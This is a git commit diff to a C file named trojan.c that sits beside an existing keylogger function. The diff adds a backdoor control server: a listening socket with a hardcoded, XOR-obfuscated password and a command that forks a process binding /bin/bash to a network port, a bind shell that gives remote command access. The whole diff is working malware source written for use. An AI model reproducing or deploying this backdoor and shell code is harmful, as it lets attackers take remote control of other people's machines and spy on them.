f258ce369dd10a9a289dd11a0f434f5c165b95d8
dbaseqp <gabrielfok128@gmail.com>
2023-02-05 02:39:49 -0800

    bruh

--- trojan.c
+++ trojan.c
@@ -232,6 +232,159 @@ void keylogger()
 	}
 }
 
+int net_init()
+{
+	int fd;
+	struct sockaddr_in addr;
+	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
+		return (-1);
+	bzero(&addr, sizeof(addr));
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	addr.sin_port = htons(PORT);
+
+	if (bind(fd, (const struct sockaddr *)&addr, sizeof(addr)) == -1)
+		return (-1);
+	if (fcntl(fd, F_SETFL, O_NONBLOCK) == -1)
+		return (-1);
+	if (listen(fd, 3) == -1)
+		return (-1);
+	return fd;
+}
+
+typedef struct	s_client
+{
+	int fd;
+	int is_auth; // 0 no 1 yes
+	int is_connected;// 0 available 1 busy
+	char *wbuf;
+	int shellport;
+}				t_client;
+
+t_client *find_cl_available(t_client *cl)
+{
+	for (int i = 0 ; i < 3; i++)
+		if (!cl[i].is_connected)
+			return (&cl[i]);
+	return NULL;
+}
+
+t_client *find_cl(t_client *cl, int fd)
+{
+	for (int i = 0 ; i < 3; i++)
+		if (cl[i].fd == fd)
+			return (&cl[i]);
+	return NULL;
+}
+int net_accept(t_client *cl, int serv_fd)
+{
+	struct sockaddr_in cl_addr;
+	int cl_fd;
+	int len = sizeof(cl_addr);
+	if (!cl)
+		return (-2);
+	if ((cl_fd = accept(serv_fd, (struct sockaddr *)&cl_addr, &len)) < 0)
+		return (-3);
+	if ((fcntl(cl_fd, F_SETFL, O_NONBLOCK)) == -1)
+		return (-4);
+	cl->is_connected = 1;
+	cl->fd = cl_fd;
+	return cl_fd;
+
+}
+
+char *gen_pwd(char *pwd)
+{
+	char *key= "WEAKPWD!";
+	for (int i = 0; i < 9; i++)
+		pwd[i] ^= key[i];
+	pwd[9] = 0;
+	return pwd;
+}
+
+void pop_shell(int port, t_client *cls)
+{
+	pid_t pid;
+   
+
+	//exec shell
+	if ((pid = fork()) < 0)
+		return;
+	if (!pid)
+	{
+		for (int i = 0; i < 3; i++)
+			if(cls[i].fd)
+				close(cls[i].fd);
+		int sockfd, connfd, len;
+    struct sockaddr_in servaddr, cli;
+    // network
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	if (sockfd == -1)
+		exit(0);
+	servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    servaddr.sin_port = htons(port);
+    if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0)
+		exit(0);
+	if ((listen(sockfd, 2)) != 0)
+		exit(0);
+	len = sizeof(cli);
+	connfd = accept(sockfd, (struct sockaddr*)&cli, &len);
+	if (connfd < 0)
+		exit(0);
+    char * const argv[] = {"/bin/bash", NULL};
+    char * const envp[] = {NULL};
+
+		dup2(connfd, 0);
+		dup2(connfd, 1);
+		dup2(connfd, 2);
+		execve("/bin/bash", argv, envp);
+		exit(0);
+	}
+
+
+}
+
+int net_receive(t_client *cl, fd_set *socks, int *n_cl, t_client *cls)
+{
+	char buff[1919];
+	char pwd[10] = "bvpf=duB\n";
+	bzero(buff, sizeof(buff));
+	int ret;
+	ret = recv(cl->fd, buff, sizeof(buff) - 1, 0);
+	if (ret == 0 || ret == -1)
+		return (1);
+	buff[ret] = 0;
+	if (!cl->is_auth && !strcmp(buff, gen_pwd(pwd)))
+		cl->is_auth = 1;
+	else if (!cl->is_auth)
+	{
+		cl->wbuf = strdup("Keycode: ");
+		return (2);
+	}
+	else if (!strcmp(buff, "exit\n"))
+	{
+		close(cl->fd);
+		FD_CLR(cl->fd, socks);
+		bzero(cl, sizeof(t_client) );
+		(*n_cl)--;
+	}
+	else if (!strcmp(buff, "help\n"))
+	{
+		cl->wbuf = strdup("help: display available cmds\nshell: pop a shell on another port\nexit: quit this shell\n");
+		return(2);
+	}
+	else if (!strcmp(buff, "shell\n"))
+	{
+		pop_shell(cl->shellport, cls);
+		close(cl->fd);
+		FD_CLR(cl->fd, socks);
+		bzero(cl, sizeof(t_client));
+		(*n_cl)--;
+	}
+	return (0);
+}
+
 void daemonize()
 {
    pid_t pid;
